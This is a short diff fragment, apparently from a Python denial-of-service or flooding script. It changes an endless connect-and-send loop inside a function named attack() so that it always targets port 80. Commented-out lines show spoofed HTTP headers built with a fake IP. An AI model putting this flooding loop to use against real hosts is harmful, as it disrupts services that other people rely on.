@@ -84,7 +84,7 @@ def attack():
     print("undefined protocol!, Ctrl + C to close!")
     
   while True: 
-    s.connect((ip, int(port)))
+    s.connect((ip, 80))
     s.send(bytes)
     #s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
     #s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
